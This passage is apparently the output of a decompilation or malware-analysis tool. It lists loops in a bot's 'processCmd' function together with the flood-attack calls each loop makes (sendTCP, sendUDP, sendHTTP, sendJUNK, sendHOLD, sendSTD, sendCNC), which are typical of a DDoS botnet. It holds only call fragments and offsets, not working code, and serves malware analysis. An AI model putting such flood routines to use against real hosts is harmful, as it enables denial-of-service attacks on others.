		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 18322 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18331 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 18384 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18396 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 18491 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18500 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 18543 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18552 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 18641 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18650 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 18707 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18717 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 18818 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18827 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 18870 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18879 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 18968 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18977 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 19030 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19042 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 19137 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19146 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 19189 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19198 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 19287 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19296 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 19422 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19431 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 19467 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19476 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 19552 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19561 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 19607 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19619 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 19651 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19660 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 19701 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19711 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 19749 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19758 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 19795 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19807 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 19839 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19848 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 19933 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19949 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v319, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 20008 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20017 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 20061 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20073 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 20115 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20124 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 20172 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20182 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 20230 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20239 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 20283 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20295 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 20337 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20346 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 20392 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20404 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 20458 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20467 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 20511 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20523 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 20565 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20574 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 20622 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20632 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 20680 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20689 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 20733 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20745 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 122 @ processCmd ====================================
++++++++ WHILE START : 20787 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20796 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 123 @ processCmd ====================================
++++++++ WHILE START : 20874 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20883 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 124 @ processCmd ====================================
++++++++ WHILE START : 20920 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20932 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 125 @ processCmd ====================================
++++++++ WHILE START : 20964 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20973 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 126 @ processCmd ====================================
++++++++ WHILE START : 21014 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21024 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 127 @ processCmd ====================================
++++++++ WHILE START : 21059 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21071 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 128 @ processCmd ====================================
++++++++ WHILE START : 21107 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21119 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 129 @ processCmd ====================================
++++++++ WHILE START : 21160 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21172 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 130 @ processCmd ====================================
++++++++ WHILE START : 21206 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21216 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 131 @ processCmd ====================================
++++++++ WHILE START : 21251 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21263 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 132 @ processCmd ====================================
++++++++ WHILE START : 21322 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21339 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v321, v171, v172);
		__libc_close(v142);
=============================WHILE LOOPS ID : 133 @ processCmd ====================================
++++++++ WHILE START : 21401 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21413 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 134 @ processCmd ====================================
++++++++ WHILE START : 21454 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21464 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 135 @ processCmd ====================================
++++++++ WHILE START : 21509 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21521 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 136 @ processCmd ====================================
++++++++ WHILE START : 21560 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21572 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 137 @ processCmd ====================================
++++++++ WHILE START : 21623 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21635 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 138 @ processCmd ====================================
++++++++ WHILE START : 21676 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21686 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 139 @ processCmd ====================================
++++++++ WHILE START : 21731 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21743 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 140 @ processCmd ====================================
++++++++ WHILE START : 21832 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21841 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 141 @ processCmd ====================================
++++++++ WHILE START : 21898 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21910 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 142 @ processCmd ====================================
++++++++ WHILE START : 21951 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21961 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 143 @ processCmd ====================================
++++++++ WHILE START : 22006 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22018 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 144 @ processCmd ====================================
++++++++ WHILE START : 22057 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22069 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 145 @ processCmd ====================================
++++++++ WHILE START : 22120 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22132 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 146 @ processCmd ====================================
++++++++ WHILE START : 22173 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22183 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 147 @ processCmd ====================================
++++++++ WHILE START : 22228 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22240 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 148 @ processCmd ====================================
++++++++ WHILE START : 22325 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22337 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 149 @ processCmd ====================================
++++++++ WHILE START : 22371 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22381 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 150 @ processCmd ====================================
++++++++ WHILE START : 22416 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22428 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 151 @ processCmd ====================================
++++++++ WHILE START : 22464 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22476 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 152 @ processCmd ====================================
++++++++ WHILE START : 22508 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22518 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 153 @ processCmd ====================================
++++++++ WHILE START : 22587 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22596 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 154 @ processCmd ====================================
++++++++ WHILE START : 22634 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22644 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 155 @ processCmd ====================================
++++++++ WHILE START : 22673 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22685 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 156 @ processCmd ====================================
++++++++ WHILE START : 22717 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22727 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 157 @ processCmd ====================================
++++++++ WHILE START : 22786 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22802 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHOLD(v323, v167, v168);
=============================WHILE LOOPS ID : 158 @ processCmd ====================================
++++++++ WHILE START : 22861 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22871 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 159 @ processCmd ====================================
++++++++ WHILE START : 22903 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22915 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 160 @ processCmd ====================================
++++++++ WHILE START : 22957 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22967 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 161 @ processCmd ====================================
++++++++ WHILE START : 23049 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23058 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 162 @ processCmd ====================================
++++++++ WHILE START : 23106 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23116 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 163 @ processCmd ====================================
++++++++ WHILE START : 23148 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23160 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 164 @ processCmd ====================================
++++++++ WHILE START : 23202 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23212 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 165 @ processCmd ====================================
++++++++ WHILE START : 23266 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23276 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v196, v171, v172);
		__libc_close(v142);
=============================WHILE LOOPS ID : 166 @ processCmd ====================================
++++++++ WHILE START : 23330 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23340 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 167 @ processCmd ====================================
++++++++ WHILE START : 23372 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23384 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 168 @ processCmd ====================================
++++++++ WHILE START : 23426 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23436 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 169 @ processCmd ====================================
++++++++ WHILE START : 23518 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23527 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 170 @ processCmd ====================================
++++++++ WHILE START : 23575 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23585 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 171 @ processCmd ====================================
++++++++ WHILE START : 23617 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23629 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 172 @ processCmd ====================================
++++++++ WHILE START : 23671 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23681 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 173 @ processCmd ====================================
++++++++ WHILE START : 23763 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23773 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 174 @ processCmd ====================================
++++++++ WHILE START : 23802 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23814 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 175 @ processCmd ====================================
++++++++ WHILE START : 23846 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23856 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 176 @ processCmd ====================================
++++++++ WHILE START : 23925 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23934 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v200, v181, v182, v183, v184, v157);
=============================WHILE LOOPS ID : 177 @ processCmd ====================================
++++++++ WHILE START : 23961 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23973 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 178 @ processCmd ====================================
++++++++ WHILE START : 24016 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24026 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v196, v171, v172);
		__libc_close(v142);
=============================WHILE LOOPS ID : 179 @ processCmd ====================================
++++++++ WHILE START : 24059 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24071 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
